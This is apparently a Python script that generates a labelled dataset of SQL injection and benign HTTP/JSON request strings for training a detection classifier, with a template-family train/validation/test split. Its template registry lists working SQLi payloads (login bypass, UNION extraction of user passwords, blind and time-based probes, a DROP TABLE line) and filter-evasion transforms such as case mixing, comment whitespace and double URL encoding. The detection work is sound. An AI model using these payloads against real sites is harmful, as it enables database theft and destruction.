"""
CLI Entry Point & Data Splitter for SQL Injection Payload Generation.
Combines Template Engine & Multi-Strategy Variation Generator.
"""
import argparse
import random
import sys
import re
import urllib.parse
import hashlib
import json
import pandas as pd
import numpy as np
from pathlib import Path
from typing import List, Dict, Tuple

ROOT_DIR = Path(__file__).resolve().parent.parent.parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

try:
    from src.config import (
        PAYLOADS_ALL_CSV, PAYLOAD_GEN_REPORT_FILE, REPORTS_DIR, DATA_DIR
    )
except ImportError:
    from config import (
        PAYLOADS_ALL_CSV, PAYLOAD_GEN_REPORT_FILE, REPORTS_DIR, DATA_DIR
    )

# ==========================================
# 1. VARIATION ENGINE HELPERS
# ==========================================

def apply_case_variation(text: str, rng: random.Random) -> str:
    """Randomize upper/lower case of SQL keywords and identifiers."""
    words = text.split(" ")
    res = []
    for w in words:
        if w.lower() in ["select", "union", "from", "where", "or", "and", "insert", "update", "delete", "drop", "alter", "create", "table", "information_schema", "sleep", "benchmark", "version", "substr", "substring", "ascii", "length", "concat", "extractvalue", "updatexml", "case", "when", "then", "else", "end", "exists", "null"]:
            choice = rng.choice(["lower", "upper", "title", "random"])
            if choice == "lower":
                res.append(w.lower())
            elif choice == "upper":
                res.append(w.upper())
            elif choice == "title":
                res.append(w.capitalize())
            else:
                res.append("".join(c.upper() if rng.random() > 0.5 else c.lower() for c in w))
        else:
            res.append(w)
    return " ".join(res)

def apply_whitespace_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    """Substitute single spaces with various whitespace representations."""
    ws_options = [
        ("space", " "),
        ("multi_space", "  "),
        ("plus", "+"),
        ("url_space", "%20"),
        ("tab", "\t"),
        ("comment_ws", "/**/"),
        ("mixed_ws", rng.choice(["   ", "+", "%20", "/**/"]))
    ]
    name, chosen_ws = rng.choice(ws_options)
    varied_text = text.replace(" ", chosen_ws)
    return varied_text, name

def apply_quote_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    """Substitute single quotes with double quotes or quote-parenthesis combinations."""
    quote_options = [
        ("single_quote", "'"),
        ("double_quote", '"'),
        ("quote_paren", "')"),
        ("double_quote_paren", '")'),
        ("escaped_quote", "\\'"),
        ("double_single_quote", "''")
    ]
    name, chosen_q = rng.choice(quote_options)
    varied_text = text.replace("'", chosen_q)
    return varied_text, name

def apply_comment_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    """Apply SQL comment terminators."""
    comment_options = [
        ("dash_dash", "--"),
        ("dash_dash_space", "-- -"),
        ("hash", "#"),
        ("url_hash", "%23"),
        ("block_comment", "/*"),
        ("semicolon_comment", ";-- -")
    ]
    name, chosen_comment = rng.choice(comment_options)
    if "{COMMENT}" in text:
        return text.replace("{COMMENT}", chosen_comment), name
    elif not text.endswith(chosen_comment):
        return f"{text}{chosen_comment}", name
    return text, name

def apply_encoding_variation(text: str, rng: random.Random) -> Tuple[str, str]:
    """Apply URL encoding variations."""
    encoding_types = ["raw", "url_encoded", "partially_encoded", "double_encoded"]
    enc_choice = rng.choice(encoding_types)

    if enc_choice == "raw":
        return text, "raw"
    elif enc_choice == "url_encoded":
        return urllib.parse.quote_plus(text), "url_encoded"
    elif enc_choice == "double_encoded":
        single = urllib.parse.quote_plus(text)
        return urllib.parse.quote_plus(single), "double_encoded"
    else:  # partially_encoded
        res = []
        for char in text:
            if char in ["'", '"', " ", "=", "-", "#", "<", ">", ";", "/", "*"] and rng.random() > 0.4:
                res.append(urllib.parse.quote_plus(char))
            else:
                res.append(char)
        return "".join(res), "partially_encoded"

# ==========================================
# 2. TEMPLATE REGISTRY (20 SQLi + 1 NORMAL)
# ==========================================

TEMPLATES = {
    # 1. Boolean-based SQLi
    "sqli_boolean": [
        "id=1' OR {EXPR} {COMMENT}",
        "id=1' AND {EXPR} {COMMENT}",
        "username=admin' OR {EXPR} {COMMENT}",
        "id=1' OR ({EXPR}) {COMMENT}",
        "id='1' OR '{VAL}'='{VAL}'",
        "id=1' OR {VAL}={VAL} {COMMENT}",
        "id=1' OR NOT ({EXPR}) {COMMENT}",
        "id=1' WHERE 1=1 OR {EXPR} {COMMENT}"
    ],
    # 2. Boolean-based Blind SQLi
    "sqli_blind_boolean": [
        "id=1' AND SUBSTRING(({SUBQUERY}),{NUM},1)='{CHAR}' {COMMENT}",
        "id=1' AND ASCII(SUBSTRING(({SUBQUERY}),{NUM},1))={ASCII_VAL} {COMMENT}",
        "id=1' AND LENGTH(({SUBQUERY}))={NUM} {COMMENT}",
        "id=1' AND (SELECT COUNT(*) FROM {TABLE})>{NUM} {COMMENT}",
        "id=1' AND MID(({SUBQUERY}),{NUM},1)='{CHAR}' {COMMENT}",
        "id=1' AND ORD(MID(({SUBQUERY}),{NUM},1))={ASCII_VAL} {COMMENT}"
    ],
    # 3. UNION-based SQLi
    "sqli_union": [
        "id=' UNION SELECT {COLS} {COMMENT}",
        "id=-1' UNION ALL SELECT {COLS} {COMMENT}",
        "id=1' UNION SELECT {COLS} FROM {TABLE} {COMMENT}",
        "id=1' UNION ALL SELECT null, {COLS} FROM {TABLE} {COMMENT}",
        "id=' UNION SELECT {COLS}, table_name FROM information_schema.tables {COMMENT}",
        "id=1' UNION SELECT user(), database(), version() {COMMENT}"
    ],
    # 4. Error-based SQLi
    "sqli_error": [
        "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({SUBQUERY}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) {COMMENT}",
        "id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({SUBQUERY}))) {COMMENT}",
        "id=1' AND UPDATEXML(1, CONCAT(0x7e, ({SUBQUERY})), 1) {COMMENT}",
        "id=1' AND CASE WHEN ({EXPR}) THEN 1/0 ELSE 1 END {COMMENT}",
        "id=1' AND EXP(~(SELECT * FROM (SELECT {SUBQUERY})a)) {COMMENT}"
    ],
    # 4b. Blind Error-based SQLi
    "sqli_blind_error": [
        "id=1' AND CASE WHEN ({EXPR}) THEN 1/0 ELSE 1 END {COMMENT}",
        "id=1' AND (SELECT 1/0 FROM dual WHERE {EXPR}) {COMMENT}",
        "id=1' AND IF(({EXPR}), (SELECT table_name FROM information_schema.tables), 0) {COMMENT}"
    ],
    # 5. Time-based Blind SQLi
    "sqli_blind_time": [
        "id=1' AND SLEEP({SLEEP_SEC}) {COMMENT}",
        "id=1' AND BENCHMARK(5000000, MD5(1)) {COMMENT}",
        "id=1' AND IF(({EXPR}), SLEEP({SLEEP_SEC}), 0) {COMMENT}",
        "id=1' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_SEC})))a) {COMMENT}",
        "id=1' AND WAITFOR DELAY '0:0:{SLEEP_SEC}' {COMMENT}"
    ],
    # 6. SQLi syntax probes
    "sqli_syntax_probe": [
        "id=1'",
        'id=1"',
        "id=1\\'",
        'id=1\\"',
        "id=1')",
        'id=1")',
        "id=1';",
        "id=1--",
        "id=1#",
        "id=1 ORDER BY 1",
        "id=1 ORDER BY 100",
        "id=1 GROUP BY 1"
    ],
    # 7. Authentication-related SQLi patterns
    "sqli_auth": [
        "username=admin' {COMMENT}&password=123",
        "username=admin' OR '1'='1' {COMMENT}&password=pass",
        "username=' OR '1'='1'&password=' OR '1'='1'",
        "username=\" OR \"1\"=\"1\"&password=\" OR \"1\"=\"1\"",
        "username=admin'--&password=anything",
        "username=' OR 1=1 {COMMENT}&password=123",
        "username=' OR ''='&password=' OR ''='"
    ],
    # 8. Numeric SQLi
    "sqli_numeric": [
        "id=1 OR {EXPR}",
        "id=1 AND {EXPR}",
        "id=1 UNION SELECT {COLS}",
        "id=1 AND SLEEP({SLEEP_SEC})",
        "id=1; DROP TABLE users",
        "id=100 OR 1=1",
        "id=1 AND 1=2"
    ],
    # 9. String-based SQLi
    "sqli_string": [
        "name=test' AND 'a'='a",
        "name=test' OR 'a'='a",
        "name=test' LIKE '%",
        "name=test' || 'a",
        "name=test' + 'a",
        "search=apple' OR '1'='1"
    ],
    # 10. Nested SQL expressions
    "sqli_nested": [
        "id=1' AND ((SELECT 1) = (SELECT 1)) {COMMENT}",
        "id=1' OR (((1=1))) {COMMENT}",
        "id=1' AND (SELECT COUNT(*) FROM (SELECT 1)t)>0 {COMMENT}",
        "id=1' OR ((('{VAL}'='{VAL}')))",
        "id=1' AND (((SELECT password FROM users WHERE user='admin')='a'))"
    ],
    # 11. Subquery-based SQLi
    "sqli_subquery": [
        "id=1' AND (SELECT password FROM users WHERE user='admin')='a' {COMMENT}",
        "id=1' AND EXISTS(SELECT * FROM users WHERE user='admin') {COMMENT}",
        "id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 {COMMENT}",
        "id=1' WHERE id=(SELECT id FROM users WHERE user='admin')"
    ],
    # 12. Database enumeration patterns
    "sqli_enum": [
        "id=1' UNION SELECT version(), user() {COMMENT}",
        "id=1' UNION SELECT database(), schema() {COMMENT}",
        "id=1' UNION SELECT @@version, @@datadir {COMMENT}",
        "id=1' UNION SELECT user(), password FROM users {COMMENT}"
    ],
    # 13. Information-schema patterns
    "sqli_info_schema": [
        "id=1' UNION SELECT table_name, table_schema FROM information_schema.tables {COMMENT}",
        "id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' {COMMENT}",
        "id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 {COMMENT}"
    ],
    # 14. Encoded SQLi
    "sqli_encoded": [
        "id=0x27204f5220313d31",
        "id=CHAR(39, 32, 79, 82, 32, 49, 61, 49)",
        "id=%27%20%4f%52%20%31%3d%31",
        "id=%2527%2520OR%25201%253d1",
        "id=CHAR(115,101,108,101,99,116)"
    ],
    # 15. Obfuscated SQLi
    "sqli_obfuscated": [
        "id=1'/**/OR/**/1=1 {COMMENT}",
        "id=1'/*!50000UNION*//*!50000SELECT*/1,2 {COMMENT}",
        "id=1' O%72 1=1 {COMMENT}",
        "id=1' unIoN sElEcT 1,2 {COMMENT}",
        "id=1'/*foo*/OR/*bar*/1=1"
    ],
    # 16. Comment-based variations
    "sqli_comment_var": [
        "id=1' OR 1=1--",
        "id=1' OR 1=1-- -",
        "id=1' OR 1=1#",
        "id=1' OR 1=1/*",
        "id=1' OR 1=1;--"
    ],
    # 17. Whitespace variations
    "sqli_whitespace_var": [
        "id=1'  OR   1=1",
        "id=1'+OR+1=1",
        "id=1'%20OR%201=1",
        "id=1'\tOR\t1=1",
        "id=1'/**/OR/**/1=1"
    ],
    # 18. Case variations
    "sqli_case_var": [
        "id=1' oR 1=1 {COMMENT}",
        "id=1' SeLeCt 1,2 {COMMENT}",
        "id=1' UnIoN sElEcT 1,2 {COMMENT}",
        "id=1' aNd 1=1 {COMMENT}"
    ],
    # 19. Parameter variations
    "sqli_param_var": [
        "search=1' OR 1=1#",
        "page=1' AND 1=1#&sort=asc",
        "cat=electronics' UNION SELECT 1,2#",
        "query=book' AND SLEEP(5)#",
        "filter=active' AND 'a'='a"
    ],
    # 20. Mixed/combined SQLi patterns
    "sqli_mixed": [
        "id=1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23",
        "username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT password FROM users),1,1)='a'#",
        "id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password) FROM users--"
    ],
    # 21. JSON SQLi Payloads (POST / JSON API bodies)
    "sqli_json": [
        '{"username": "admin\' OR {EXPR} {COMMENT}", "password": "{VAL}"}',
        '{"query": "laptop\' UNION SELECT {COLS} {COMMENT}", "limit": {NUM}}',
        '{"filter": {"user_id": "1\' AND SLEEP({SLEEP_SEC}) {COMMENT}", "status": "active"}}',
        '{"data": {"search": "\' OR 1=1 {COMMENT}", "category": "all"}}',
        '{"auth": {"username": "admin\'-- -", "password": "{VAL}"}, "remember": true}',
        '{"id": "1\' AND EXTRACTVALUE(1, CONCAT(0x7e, ({SUBQUERY}))) {COMMENT}"}',
        '{"items": [{"id": "1\' OR {EXPR} {COMMENT}", "qty": 1}]}',
        '{"order_by": "id\' UNION SELECT {COLS} FROM {TABLE} {COMMENT}"}',
        '{"search": "\' UNION ALL SELECT null, {COLS} FROM {TABLE} {COMMENT}", "page": {NUM}}',
        '{"user": {"name": "test\' AND (SELECT COUNT(*) FROM users)>{NUM} {COMMENT}", "role": "user"}}',
        '{"comment": "test\' AND CASE WHEN ({EXPR}) THEN 1/0 ELSE 1 END {COMMENT}", "post_id": {NUM}}'
    ],
    # 22. NORMAL TRAFFIC (Non-Malicious)
    "normal": [
        "id={NUM}&Submit=Submit",
        "page={NUM}&limit=10",
        "search={SEARCH_WORD}",
        "category={CATEGORY}&sort={SORT}",
        "user={USER_NAME}",
        "title={TITLE}&submit=Search",
        "date=2026-09-08&status=active",
        "tag={TAG}",
        "filter=active&page={NUM}",
        "article_id={NUM}&author={USER_NAME}",
        "query={SEARCH_WORD}&lang=en",
        "product_id={NUM}&qty=1",
        "book_title=O'Connor's+Guide",
        "comment=User's+feedback+text",
        "name=John+Doe&email=john%40example.com"
    ],
    # 23. NORMAL JSON (Non-Malicious API bodies)
    "normal_json": [
        '{"search": "{SEARCH_WORD}", "page": {NUM}, "category": "{CATEGORY}"}',
        '{"username": "{USER_NAME}", "action": "login", "remember": true}',
        '{"product_id": {NUM}, "quantity": {NUM}, "notes": "fast delivery"}',
        '{"filter": {"status": "active", "tag": "{TAG}"}, "limit": {NUM}}',
        '{"title": "{TITLE}", "content": "Customer review on {CATEGORY}", "author": "{USER_NAME}"}',
        '{"user": {"name": "{USER_NAME}", "email": "{USER_NAME}@example.com", "preferences": {"theme": "dark"}}}',
        '{"cart": [{"item_id": {NUM}, "qty": 1, "price": 99.9}], "currency": "USD"}',
        '{"sort": "{SORT}", "order": "desc", "per_page": {NUM}}',
        '{"event": "page_view", "path": "/products", "user": "{USER_NAME}"}',
        '{"config": {"notifications": true, "timeout": {NUM}, "mode": "standard"}}'
    ]
}

EXPR_LIST = ["1=1", "2>1", "'a'='a'", "CHAR(97)='a'", "LENGTH('test')=4", "7=7", "100<200", "ASCII('A')=65"]
SUBQUERIES = ["SELECT password FROM users WHERE user='admin'", "SELECT version()", "SELECT user()", "SELECT database()"]
TABLES = ["users", "information_schema.tables", "information_schema.columns", "dvwa.users"]
COLS_LIST = ["1,2", "user,password", "table_name,table_schema", "column_name,null", "1,version()"]
CHAR_LIST = ["a", "b", "c", "1", "admin", "p", "e", "s"]
SEARCH_WORDS = ["laptop", "phone", "book", "python", "machine_learning", "cybersecurity", "web_app", "database"]
CATEGORIES = ["electronics", "books", "clothing", "sports", "home", "toys"]
SORTS = ["price_asc", "price_desc", "newest", "popularity", "name_asc"]
USER_NAMES = ["john_doe", "alice", "bob_smith", "user123", "admin_viewer", "guest"]
TAGS = ["security", "tech", "news", "tutorial", "dev", "ai"]

# ==========================================
# 3. GENERATOR ENGINE CLASS
# ==========================================

class PayloadGenerator:
    def __init__(self, seed: int = 42):
        self.seed = seed
        self.rng = random.Random(seed)

    def generate_single_from_template(self, category: str, template_str: str, template_id: str) -> Dict:
        """Instantiate a single template with random values and variation strategies."""
        raw_text = template_str
        is_json = category.endswith("json") or raw_text.startswith("{")

        # Fill placeholders
        raw_text = raw_text.replace("{EXPR}", self.rng.choice(EXPR_LIST))
        raw_text = raw_text.replace("{SUBQUERY}", self.rng.choice(SUBQUERIES))
        raw_text = raw_text.replace("{TABLE}", self.rng.choice(TABLES))
        raw_text = raw_text.replace("{COLS}", self.rng.choice(COLS_LIST))
        raw_text = raw_text.replace("{CHAR}", self.rng.choice(CHAR_LIST))
        raw_text = raw_text.replace("{ASCII_VAL}", str(self.rng.randint(65, 122)))
        raw_text = raw_text.replace("{NUM}", str(self.rng.randint(1, 50)))
        raw_text = raw_text.replace("{VAL}", str(self.rng.randint(1, 100)))
        raw_text = raw_text.replace("{SLEEP_SEC}", str(self.rng.choice([1, 2, 5, 10])))
        raw_text = raw_text.replace("{SEARCH_WORD}", self.rng.choice(SEARCH_WORDS))
        raw_text = raw_text.replace("{CATEGORY}", self.rng.choice(CATEGORIES))
        raw_text = raw_text.replace("{SORT}", self.rng.choice(SORTS))
        raw_text = raw_text.replace("{USER_NAME}", self.rng.choice(USER_NAMES))
        raw_text = raw_text.replace("{TITLE}", self.rng.choice(SEARCH_WORDS).capitalize())
        raw_text = raw_text.replace("{TAG}", self.rng.choice(TAGS))

        variant_types = []

        if is_json:
            # Safely handle comment placeholder inside JSON strings
            if "{COMMENT}" in raw_text:
                chosen_c = self.rng.choice(["--", "-- -", "#", "/*", ";-- -", ""])
                raw_text = raw_text.replace("{COMMENT}", chosen_c).strip()
                if chosen_c:
                    variant_types.append(f"comment_{chosen_c}")
            if self.rng.random() > 0.4 and not category.startswith("normal"):
                raw_text = apply_case_variation(raw_text, self.rng)
                variant_types.append("case_var")
            final_payload = raw_text
            enc_type = "raw_json"
        else:
            # Apply Variations for URL Query/Form
            if self.rng.random() > 0.4 and not category.startswith("normal"):
                raw_text = apply_case_variation(raw_text, self.rng)
                variant_types.append("case_var")

            if "{COMMENT}" in raw_text or (self.rng.random() > 0.5 and category.startswith("sqli")):
                raw_text, c_name = apply_comment_variation(raw_text, self.rng)
                variant_types.append(f"comment_{c_name}")
            else:
                raw_text = raw_text.replace("{COMMENT}", "").strip()

            if self.rng.random() > 0.4 and not category.startswith("normal"):
                raw_text, ws_name = apply_whitespace_variation(raw_text, self.rng)
                variant_types.append(f"ws_{ws_name}")

            final_payload, enc_type = apply_encoding_variation(raw_text, self.rng)

        label = 0 if category.startswith("normal") else 1
        variant_str = "|".join(variant_types) if variant_types else "standard"

        norm_str = re.sub(r'\s+', '', final_payload.lower())
        norm_hash = hashlib.md5(norm_str.encode("utf-8")).hexdigest()
        payload_hash = hashlib.md5(final_payload.encode("utf-8")).hexdigest()

        return {
            "payload": final_payload,
            "label": label,
            "attack_type": category,
            "variant_type": variant_str,
            "encoding_type": enc_type,
            "template_id": template_id,
            "normalized_hash": norm_hash,
            "payload_hash": payload_hash,
            "length": len(final_payload)
        }

    def generate_dataset(self, target_count: int = 15000, category_filter: str = "all") -> Tuple[List[Dict], Dict]:
        """Generate deduplicated payload dataset matching target counts."""
        dataset = []
        seen_hashes = set()
        seen_norm_hashes = set()

        stats = {
            "generated": 0,
            "unique": 0,
            "duplicates_removed": 0
        }

        if target_count <= 0:
            target_count = 2000

        categories = [c for c in TEMPLATES.keys() if category_filter in ["all", c]]

        if category_filter == "all":
            normal_target = int(target_count * 0.40)
            sqli_categories = [c for c in categories if not c.startswith("normal")]
            sqli_target_per_cat = max(100, int((target_count * 0.60) / len(sqli_categories)))
        else:
            normal_target = target_count if category_filter.startswith("normal") else 0
            sqli_categories = [category_filter] if not category_filter.startswith("normal") else []
            sqli_target_per_cat = target_count

        # 1. Generate Normal samples (mix of normal URL/form and normal JSON)
        if normal_target > 0:
            norm_cats = [c for c in ["normal", "normal_json"] if c in TEMPLATES]
            norm_sub_target = int(normal_target / len(norm_cats))

            for n_cat in norm_cats:
                norm_templates = TEMPLATES[n_cat]
                attempts = 0
                current_norm_cnt = 0
                while current_norm_cnt < norm_sub_target and attempts < norm_sub_target * 5:
                    attempts += 1
                    t_idx = self.rng.randint(0, len(norm_templates) - 1)
                    t_str = norm_templates[t_idx]
                    t_id = f"{n_cat.upper()}_{t_idx+1:03d}"

                    rec = self.generate_single_from_template(n_cat, t_str, t_id)
                    stats["generated"] += 1

                    if rec["payload_hash"] not in seen_hashes and rec["normalized_hash"] not in seen_norm_hashes:
                        seen_hashes.add(rec["payload_hash"])
                        seen_norm_hashes.add(rec["normalized_hash"])
                        dataset.append(rec)
                        current_norm_cnt += 1
                        stats["unique"] += 1
                    else:
                        stats["duplicates_removed"] += 1

        # 2. Generate SQLi samples across all SQLi categories (including sqli_json)
        for cat in sqli_categories:
            cat_templates = TEMPLATES[cat]
            attempts = 0
            current_cat_cnt = 0
            while current_cat_cnt < sqli_target_per_cat and attempts < sqli_target_per_cat * 5:
                attempts += 1
                t_idx = self.rng.randint(0, len(cat_templates) - 1)
                t_str = cat_templates[t_idx]
                t_id = f"{cat.upper()}_{t_idx+1:03d}"

                rec = self.generate_single_from_template(cat, t_str, t_id)
                stats["generated"] += 1

                if rec["payload_hash"] not in seen_hashes and rec["normalized_hash"] not in seen_norm_hashes:
                    seen_hashes.add(rec["payload_hash"])
                    seen_norm_hashes.add(rec["normalized_hash"])
                    dataset.append(rec)
                    current_cat_cnt += 1
                    stats["unique"] += 1
                else:
                    stats["duplicates_removed"] += 1

        return dataset, stats

# ==========================================
# 4. DATA SPLITTER & EXPORTER FUNCTIONS
# ==========================================

def split_dataset_by_template_family(df: pd.DataFrame, train_ratio: float = 0.70, val_ratio: float = 0.15, test_ratio: float = 0.15, seed: int = 42):
    """
    Split dataset ensuring ZERO template_id / payload family leakage into test_unseen set.
    """
    rng = random.Random(seed)
    template_ids = df["template_id"].unique().tolist()
    rng.shuffle(template_ids)

    n_templates = len(template_ids)
    n_train = int(n_templates * train_ratio)
    n_val = int(n_templates * val_ratio)

    train_tids = set(template_ids[:n_train])
    val_tids = set(template_ids[n_train:n_train+n_val])
    test_unseen_tids = set(template_ids[n_train+n_val:])

    df_train = df[df["template_id"].isin(train_tids)].copy()
    df_val = df[df["template_id"].isin(val_tids)].copy()
    df_test_unseen = df[df["template_id"].isin(test_unseen_tids)].copy()

    return df_train, df_val, df_test_unseen

def generate_report(dataset: list, stats: dict, df_train: pd.DataFrame, df_val: pd.DataFrame, df_test_unseen: pd.DataFrame) -> str:
    df_all = pd.DataFrame(dataset)
    lengths = df_all["length"].tolist()

    normal_cnt = (df_all["label"] == 0).sum()
    sqli_cnt = (df_all["label"] == 1).sum()

    attack_distribution = df_all[df_all["label"] == 1]["attack_type"].value_counts().to_dict()

    report = f"""====================================
PAYLOAD GENERATION REPORT
====================================
Total Generated:     {stats['generated']}
Total Unique:        {stats['unique']}
Duplicates Removed: {stats['duplicates_removed']}

Normal Count:        {normal_cnt} ({normal_cnt/len(df_all)*100:.2f}%)
SQLi Count:          {sqli_cnt} ({sqli_cnt/len(df_all)*100:.2f}%)

Dataset Splits (Family/Template Grouped Split - Zero Leakage):
  - Train:           {len(df_train)} samples ({len(df_train['template_id'].unique())} templates)
  - Validation:      {len(df_val)} samples ({len(df_val['template_id'].unique())} templates)
  - Test (Unseen):   {len(df_test_unseen)} samples ({len(df_test_unseen['template_id'].unique())} templates)

SQLi Attack Type Distribution:
"""
    for atk, cnt in attack_distribution.items():
        report += f"  - {atk}: {cnt}\n"

    report += f"""
Unique Templates:    {df_all['template_id'].nunique()}
Unique Payload Hashes: {df_all['payload_hash'].nunique()}

Payload Length Statistics:
  - Min Length:    {min(lengths)}
  - Max Length:    {max(lengths)}
  - Mean Length:   {np.mean(lengths):.2f}
  - Median Length: {np.median(lengths):.2f}
====================================
"""
    return report

def main():
    parser = argparse.ArgumentParser(description="Multi-Strategy SQL Injection & Normal HTTP Payload Generator")
    parser.add_argument("--count", type=int, default=15000, help="Total target number of unique payloads to generate (Default: 15000)")
    parser.add_argument("--type", type=str, default="all", help="Attack category filter ('all', 'normal', 'sqli_boolean', 'sqli_union', etc.)")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility (Default: 42)")
    parser.add_argument("--train-ratio", type=float, default=0.70, help="Train split ratio (Default: 0.70)")
    parser.add_argument("--val-ratio", type=float, default=0.15, help="Validation split ratio (Default: 0.15)")
    parser.add_argument("--test-ratio", type=float, default=0.15, help="Test unseen ratio (Default: 0.15)")

    args = parser.parse_args()

    print(f"Starting payload generation (Target: {args.count}, Type: {args.type}, Seed: {args.seed})...")

    generator = PayloadGenerator(seed=args.seed)
    dataset, stats = generator.generate_dataset(target_count=args.count, category_filter=args.type)

    df_all = pd.DataFrame(dataset)

    # Perform zero-leakage family-grouped split
    df_train, df_val, df_test_unseen = split_dataset_by_template_family(
        df_all, train_ratio=args.train_ratio, val_ratio=args.val_ratio, test_ratio=args.test_ratio, seed=args.seed
    )

    # Save CSV Datasets
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)

    df_all.to_csv(PAYLOADS_ALL_CSV, index=False, encoding="utf-8")

    report_text = generate_report(dataset, stats, df_train, df_val, df_test_unseen)

    with open(PAYLOAD_GEN_REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(report_text)

    print(report_text)
    print(f"Saved dataset file to: {PAYLOADS_ALL_CSV}")
    print(f"Report saved to: {PAYLOAD_GEN_REPORT_FILE}")

if __name__ == "__main__":
    main()
